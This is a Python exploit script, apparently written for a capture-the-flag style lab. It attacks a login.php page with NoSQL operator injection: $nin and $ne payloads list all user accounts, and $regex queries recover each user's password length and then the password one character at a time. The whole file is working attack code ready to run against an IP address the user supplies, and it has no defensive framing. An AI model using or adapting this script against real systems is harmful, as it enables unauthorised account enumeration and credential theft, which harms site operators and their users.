import requests
from bs4 import BeautifulSoup
from string import ascii_letters, digits


GREEN = "\033[92m"
RED = "\033[91m"
PURPLE = "\033[95m"
RESET = "\033[97m"


# Use Burpsuit to see how data section is built
def build_payload(users) -> str:
    users_payload = [f"user[$nin][]={user}" for user in users]
    users_payload.append(
        "pass[$ne]=r4nd0mp4ssw0rdth4tw0uldpr0b4blyn0t3xist&remember=on"
    )
    payload = "&".join(users_payload)
    return payload


def get_users(ip, seen_users=None) -> list:

    # random username to provoke an error that will give the first known user
    initial_fake_user = "r4nd0mus3rth4tw0uldpr0b4blyn0t3xist"

    if seen_users is None:
        seen_users = [initial_fake_user]

    session = requests.session()
    url = f"http://{ip}/login.php"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}",
    }

    while True:

        data = build_payload(seen_users)

        response = session.post(url, headers=headers, data=data)
        soup = BeautifulSoup(response.text, "html.parser")

        # grabs the username from the response page
        user_line = soup.find("td", string="User:")

        if not user_line:
            break

        user = user_line.find_next_sibling("td").get_text(strip=True)

        # last found user will provoke an infinite loop
        if user in seen_users:
            break

        else:
            seen_users.append(user)

    seen_users.remove(initial_fake_user)

    return seen_users


def get_pass_length(ip, user, max_length=15):
    session = requests.session()
    url = f"http://{ip}/login.php"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}",
    }

    pass_length = 0

    while pass_length < max_length:

        # Builds a regular expression like "^.{n}$" n incrementing from 0 to max_length (default : 15)
        data = f"user={user}&pass[$regex]=^.{{{pass_length}}}$&remember=on"
        response = session.post(url, headers=headers, data=data, allow_redirects=False)

        # Results will bring to an error until the proper length is found
        if response.headers.get("Location") != "/?err=1":
            print(f"{PURPLE}[+] Password lenght found : {pass_length}{RESET}")
            return pass_length

        else:
            pass_length += 1

    return f"{RED}[-] Password too long (over {max_length} characters){RESET}"


def get_password(ip, user):

    pass_length = get_pass_length(ip, user)
    char_set = digits + ascii_letters

    session = requests.session()
    url = f"http://{ip}/login.php"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}",
    }

    password = ""

    for _ in range(pass_length):

        for char in char_set:

            # attempt will test a regex version of the password char by char
            # completing it with unknown remaining characters => $^pass.{4}$ for pass1234 for example
            attempt = password + char + (f".{{{pass_length - _ - 1}}}")

            data = f"user={user}&pass[$regex]=^{attempt}$&remember=on"
            response = session.post(
                url, headers=headers, data=data, allow_redirects=False
            )

            # if the added character doesn't lead to error page, it's validated
            if response.headers.get("Location") != "/?err=1":
                password += char
                print(
                    f"{GREEN}{len(password)} char / {pass_length} => {password}{RESET}"
                )
                break

    print(f"{PURPLE}[+] Password found => {password}{RESET}")
    return password


if __name__ == "__main__":
    ip = input("IP address : ")
    print(f"User accounts : {get_users(ip)}")
    while True:
        user = input("User : ")
        if user in get_users(ip):
            get_password(ip, user)
            print(get_users(ip))
        else:
            print(f"{RED}[-] Invalid username{RESET}")
